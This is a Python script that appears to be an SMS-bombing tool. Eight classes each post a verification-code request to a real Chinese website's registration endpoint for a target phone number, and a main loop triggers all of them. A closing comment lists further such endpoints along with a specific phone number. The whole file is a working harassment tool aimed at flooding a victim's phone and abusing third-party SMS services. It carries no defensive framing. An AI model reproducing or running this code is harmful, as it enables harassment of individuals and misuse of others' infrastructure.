import requests
import time
import json


class SMSsend:
    """
    短信类
    """
    __MSG_NAME__ = None
    url = None
    header = None
    data = None

    @classmethod
    def run(cls, mobile):
        """
        调用短信API发送短信
        :return:
        """
        try:
            respone = requests.post(url=cls.url, data=cls.data, headers=cls.header).text
            print(respone)
            print(f'{mobile}>>>发送成功: {cls.__MSG_NAME__}')
        except Exception as e:
            print(f'{mobile}>>>发送失败: {cls.__MSG_NAME__} {str(e)}')


class SMSsend_one(SMSsend):
    __MSG_NAME__ = '数码之家'
    url = "http://bbs.mydigit.cn/registe.php"
    header = {
        "Referer": "http: // bbs.mydigit.cn / registe.php",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
    }
    data = {
        "action": "auth",
        "step": "1",
        "mobile": None
    }

    @classmethod
    def run(cls, mobile):
        cls.data['mobile'] = mobile
        super(SMSsend_one, cls).run(mobile)


class SMSsend_two(SMSsend):
    __MSG_NAME__ = '世界经理人'
    url = "https://login.ceconline.com/thirdPartLogin.do"
    header = {
        "Referer": "https://login.ceconline.com/pcMobileNumberRegister.do",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
    }
    data = {
        "mobileNumber": None,
        "method": "getDynamicCode",
        "verifyType": "MOBILE_NUM_REG",
        "captcharType": "",
        "time": None
    }

    @classmethod
    def run(cls, mobile):
        cls.data['mobileNumber'] = mobile
        cls.data['time'] = str(int(time.time() * 1000))
        super(SMSsend_two, cls).run(mobile)


class SMSsend_three(SMSsend):
    __MSG_NAME__ = '南通市机动车'
    url = "http://www.ntjxj.com/InternetWeb/SendYzmServlet"
    header = {
        "Referer": "http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http: // www.ntjxj.com',
        'Content-Length': '16'
    }
    data = {
        "sjhm": None
    }

    @classmethod
    def run(cls, mobile):
        cls.data['sjhm'] = mobile
        super(SMSsend_three, cls).run(mobile)


class SMSsend_four(SMSsend):
    __MSG_NAME__ = '短信接口'
    url = "https://www.itjuzi.com/user/send_register_code"
    header = {
        "Referer": "https://www.itjuzi.com/user/register?redirect=search%3Fword%3DE%E5%AE%A0%E5%95%86%E5%9F%8E&flag=",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
    }
    data = {
        "mobile": None,
        "click_time": None,
        "token": "0641258293a4b7b014ff5750238072b0e390e9d2"
    }

    @classmethod
    def run(cls, mobile):
        cls.data['mobile'] = mobile
        cls.data['click_time'] = str(int(time.time() * 1000))
        super(SMSsend_four, cls).run(mobile)


class SMSsend_five(SMSsend):
    __MSG_NAME__ = '短信接口'
    url = "https://ems.xg-yc.com/ent/sendMobileCode"
    header = {
        "Referer": "https://ems.xg-yc.com/",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Content - Type': 'application/json',
        'Cookie': 'JSESSIONID = 5D1E51B9C503FA37E84CBBFD0E90855F',
        'Host': 'ems.xg - yc.com',
        'Origin': 'https: // ems.xg - yc.com'
    }
    data = {
        "mobile": None,
    }

    @classmethod
    def run(cls, mobile):
        cls.data['mobile'] = mobile
        cls.data = json.dumps(cls.data)
        super(SMSsend_five, cls).run(mobile)


class SMSsend_six(SMSsend):
    __MSG_NAME__ = '中央大厨房'

    @classmethod
    def run(cls, mobile):
        url = "http://weixin.fresh300.com"
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        }
        response = requests.get(url=url, headers=header)
        new_url = response.url

        operate = 1
        qiege = new_url.split("=")
        OrganId = qiege[1].split("&")[0]
        BusinessId = qiege[2].split("&")[0]
        ShopId = qiege[3].split("&")[0]

        data = {
            'MobilePhone': mobile,
            'operate': operate,
            'OrganId': OrganId,
            'BusinessId': BusinessId,
            'ShopId': ShopId
        }
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Referer': new_url
        }
        cls.url = "http://weixin.fresh300.com/services/Other/Register.ashx"
        cls.header = header
        cls.data = data
        super(SMSsend_six, cls).run(mobile)


class SMSsend_seven(SMSsend):
    __MSG_NAME__ = '易法通'
    url = "http://www.yifatong.com/Customers/getcode?rnd="
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/63.0.3239.132 Safari/537.36',
        'Referer': 'http://www.yifatong.com/Customers/registration?url=',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep - alive'
    }

    @classmethod
    def run(cls, mobile):
        time_now = time.time()
        time_new = ("%0.3f" % time_now)
        cls.url = cls.url + time_new + "&mobile=" + mobile
        super(SMSsend_seven, cls).run(mobile)


class SMSsend_eight(SMSsend):
    __MSG_NAME__ = '天津电子化商务'
    url = "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login"
    header = {
        "Referer": "http://qydj.scjg.tj.gov.cn/reportOnlineService/",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
    }
    data = {
        'MOBILENO': None,
        'TEMP': 1
    }

    @classmethod
    def run(cls, mobile):
        cls.data['MOBILENO'] = mobile
        super(SMSsend_eight, cls).run(mobile)

# http://m.10010.com/mall-mobile/CheckMessage/captcha?phoneVal=15726926008&type=8


"""
header:
Accept:image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding:gzip, deflate
Accept-Language:zh-CN,zh;q=0.9
Connection:keep-alive
Host:m.10010.com
Referer:http://www.17173.pw/dx/index.php?hm=15726926008&ok=1
User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

data:
phoneVal:15726926008
type:8

Request URL:https://www.airparking.cn/h5app/sms/signup?mobile=15726926008


referer:http://www.17173.pw/dx/index.php?hm=15726926008&ok=1
user-agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

Request URL:http://app.jammyfm.com/api/v1/user/mobile-captcha/send?phone=15726926008
Request URL:http://n.youyuan.com/v20/yuan/get_registerMobile_code.html?mobile=15726926008%20&from=5599
Request URL:http://www.189.cn/dqmh/uamGetCheckCodeAction.do?method=getSMSDynamicCode&phoneNumber=15726926008%20&ikl=1
"""


def main():
    for class_ in SMSsend.__subclasses__():
        class_.run('')


if __name__ == "__main__":
    main()
